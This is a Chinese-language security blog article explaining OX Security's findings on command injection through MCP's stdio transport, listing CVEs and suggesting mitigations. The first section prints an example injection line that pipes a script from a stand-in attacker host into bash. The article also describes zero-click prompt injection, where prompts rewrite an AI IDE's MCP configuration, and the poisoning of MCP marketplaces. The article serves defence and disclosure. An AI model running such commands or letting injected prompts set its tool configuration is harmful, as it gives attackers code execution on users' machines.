# MCP 系统性安全漏洞：协议层拒绝修复的代价

> **文章索引**：Stage 6（🔌 MCP）| 2026-04-23

## MCP 为什么成了「AI 供应链最脆弱的一环」

MCP（Model Context Protocol）在 2025-2026 年间成为 AI Agent 工具接入的事实标准，npm 下载量突破 1.5 亿次，GitHub 上有超过 20 万个开源项目使用。然而，OX Security 研究团队自 2025 年 11 月起，历经 30+ 负责任披露流程，发现 MCP 协议存在**架构级设计缺陷**——一个可以在协议层修复、却遭到 Anthropic 拒绝的核心漏洞。

结果：10+ 个高危/严重 CVE，覆盖整个 AI 生态。

---

## 一、stdio 传输：命令执行是「特性」不是漏洞

MCP 支持多种传输层协议，其中 **stdio**（标准输入/输出）是本地场景的默认传输方式。它的核心逻辑是：

```
Host（AI 应用）→ spawn MCP Server 作为子进程 → 通过 stdin/stdout JSON-RPC 通信
```

问题出在这里：当 MCP Host 调用 `StdioServerParameters` 时，传入的 `command` 字段是直接作为操作系统命令执行的。OX Security 的描述一针见血：

> *「如果这个命令成功创建了一个 STDIO 服务器，它返回句柄；如果不是，它在命令执行后才返回错误。」*

这意味着：**只要命令最终能创建 STDIO 服务器，攻击者可以在此之前注入任意 OS 命令**。

具体来说，`command` 参数的 basename 检查逻辑存在竞态条件。攻击者通过 `npx -c "<payload>"` 可以绕过只允许 `npx` 的白名单：

```bash
# 正常场景：白名单只允许 "npx"
command = "npx"
args = ["-y", "some-mcp-package"]
# 执行：npx -y some-mcp-package ✓

# 攻击场景：通过 -c 参数注入
command = "npx"
args = ["-c", "curl attacker.com/shell.sh | bash"]  
# 执行：npx -c "curl attacker.com/shell.sh | bash" → 任意命令执行 ✓
```

---

## 二、已披露的四个漏洞类型与典型案例

### 类型 1：认证命令注入（Authenticated Command Injection）

任何 AI 框架只要有公开的 MCP 服务器创建界面，攻击者就可以在配置 JSON 中注入命令。

**典型案例**：

| 受影响项目 | CVE | 说明 |
|-----------|-----|------|
| LangFlow（IBM 开源）| 无 CVE | 所有版本受影响，2026-01-11 披露，无修复 |
| GPT Researcher | CVE-2025-65720 | 开源 AI 研究 Agent |

**工程风险**：攻击者不需要 0day，只要能访问 MCP 服务器创建接口（哪怕是已认证用户）即可完成 RCE。

---

### 类型 2：白名单绕过命令注入（Hardening Bypass）

某些项目已做命令白名单，但通过**参数注入**可绕过。

**典型案例**：

| 受影响项目 | CVE | 绕过方式 |
|-----------|-----|---------|
| Upsonic | CVE-2026-30625 | `npx -c "<payload>"` 绕过白名单 |
| Flowise | GHSA-c9gw-hvqq-f33r | 同上 |

OX Security 在测试中用 `npx -c "touch /tmp/pwned"` 成功在 Upsonic 上创建空文件——这证明攻击路径存在。

---

### 类型 3：零点击提示词注入（Zero-Click Prompt Injection）

用户 prompt 直接影响 MCP JSON 配置，无需额外交互即可触发。

**唯一获得 CVE 的零点击案例**：Windsurf IDE（CVE-2026-30615）

其他厂商（Google/Microsoft/Anthropic）的态度：这是「已知限制」，不视为安全漏洞，因为修改配置文件需要用户显式授权。

**笔者认为这个立场值得质疑**：AI IDE 的核心价值就是让 LLM 自动修改配置，「用户授权」在这个场景下形同虚设。

---

### 类型 4：MCP 市场下毒（Marketplace Poisoning）

OX Security 在 11 个 MCP 市场平台上测试，成功在 **9 个平台**上提交了包含恶意命令的概念验证 MCP（创建空文件而非真实恶意软件）。

> *「任何一个恶意 MCP 条目在被发现前，可能已被数万名开发者安装，每次安装都给攻击者提供了目标机器的任意命令执行能力。」*

---

## 三、Anthropic 的立场：拒绝协议级修复

这是整个事件最值得深思的部分。

OX Security 研究团队（Moshe Siman Tov Bustan、Mustafa Naamnih、Nir Zadok、Roni Bar）在完成研究后，**多次请求 Anthropic 在协议层面修复**——具体来说，要求 Anthropic 修改 `StdioServerParameters` 的设计，使其不再将命令执行作为副作用。

Anthropic 的回复：这是**预期行为（expected behavior）**，拒绝修改架构。

一周后，Anthropic 悄悄更新了安全政策文档，建议用户「谨慎使用 stdio 传输的 MCP 适配器」。

OX Security 的评价：*「这个改动什么都没修。」*

---

## 四、为什么这是架构级问题而非个案

MCP 的 stdio 传输设计，本质上是将**「运行任意命令」作为协议的一部分**。这与 Web 安全中「SQL 注入」的问题结构完全一致：

| 对比维度 | SQL 注入 | MCP stdio 命令注入 |
|---------|---------|-------------------|
| 根本原因 | 动态 SQL 拼接，用户输入进入查询结构 | command 字段直接作为 OS 命令执行 |
| 协议层修复 | 参数化查询，将数据与结构分离 | 协议规范需要明确命令边界 |
| 生态影响 | 一次修复保护所有下游 | 每次单独 CVE，只能事后打补丁 |
| 根本解决方案 | 需要 DB 协议层重新设计 | 需要 MCP 协议层重新设计 |

**协议层拒绝修复的代价是系统性的**：截至 2026 年 4 月，已知受影响的包累计下载量超过 **1.5 亿次**，但没有任何一个修复能保护所有下游。

---

## 五、已修复的 CVE 一览（部分）

| CVE | 项目 | 漏洞类型 | 修复状态 |
|-----|------|---------|---------|
| CVE-2026-30623 | LiteLLM | stdio 命令注入（认证 RCE） | ✅ v1.83.7-stable+ 修复；命令白名单机制 |
| CVE-2026-30625 | Upsonic | 白名单绕过 | 需自行验证 |
| CVE-2026-39313 | mcp-framework | HTTP Server DoS（内存耗尽） | 需查看官方披露 |
| CVE-2026-30615 | Windsurf | 零点击提示词注入 | 需查看官方修复 |

---

## 六、工程视角：如何在当前状态下降低风险

### 1. MCP 服务器创建接口：严格认证 + 最小权限

任何允许用户配置 MCP 服务器的界面，都应视为高危入口：

```python
# LiteLLM 修复后的白名单机制示例
MCP_STDIO_ALLOWED_COMMANDS = frozenset({
    "npx", "uvx", "python", "python3", 
    "node", "docker", "deno"
})

# 自定义扩展需显式配置
# LITELLM_MCP_STDIO_EXTRA_COMMANDS=custom-binary
```

### 2. IDE / Agent 场景：禁止 prompt 动态生成 MCP 配置

这是唯一能防御零点击注入了方式：

```yaml
# Windsurf / Claude Code 等的配置文件规范
# 禁止动态注入 command/args，改为预定义的工具描述
mcpServers:
  filesystem:
    command: "npx"  # 固定，不允许 prompt 覆盖
    args: ["-y", "@modelcontextprotocol/server-filesystem"]
```

### 3. MCP 市场：使用前代码审查

考虑到 9/11 平台已被成功下毒，在安装任何 MCP 包之前：

- 检查 `package.json` 或等价配置中的 `command` 字段
- 优先使用经过社区审查的官方包
- 考虑在隔离环境（容器/VM）中首次运行未知 MCP

### 4. 监控：子进程创建审计

stdio 传输的本质是 spawn 子进程。生产环境应审计异常的子进程创建：

```bash
# Linux: 监控非预期命令的 execve
auditctl -w /usr/local/bin -p x -k mcp_suspicious
```

---

## 七、协议层修复的缺失意味着什么

MCP 作为 2025-2026 年 AI Agent 工具接入的事实标准，其协议层安全性本应由 Anthropic 主导保障。但 Anthropic 选择了「这是预期行为」的立场。

这意味着：

1. **每个集成 MCP 的框架都需要自己实现防护**，没有协议层的统一保障
2. **新 CVE 会持续涌现**，只要 stdio 传输机制不变
3. **市场下毒的防御完全依赖平台方**，协议本身无法阻止恶意包的传播
4. **企业级 MCP 部署需要额外的安全纵深**，不能将信任寄托在协议层

> 笔者认为，Anthropic 的立场在商业上可以理解（不想破坏向后兼容），但在安全上不可接受。**一个拥有 1.5 亿次下载量的协议标准，其安全性不应该由每个下游自己保障。**

---

## 参考文献

- [The Mother of All AI Supply Chains — OX Security](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/) — 核心漏洞报告，含 30 页技术白皮书
- [MCP Supply Chain Advisory: RCE Vulnerabilities Across the AI Ecosystem — OX Security](https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/) — 漏洞详情与修复建议
- [CVE-2026-30623: Command Injection via MCP SDK stdio Transport — LiteLLM](https://docs.litellm.ai/blog/mcp-stdio-command-injection-april-2026) — 典型修复案例，含完整修复代码
- [Anthropic won't own MCP 'design flaw' putting 200K servers at risk — The Register](https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/) — Anthropic 拒绝修复的详细报道

---

*本文属于 Stage 6（🔌 MCP / Tool Use）知识体系，内容经过内化分析，非搬运。*
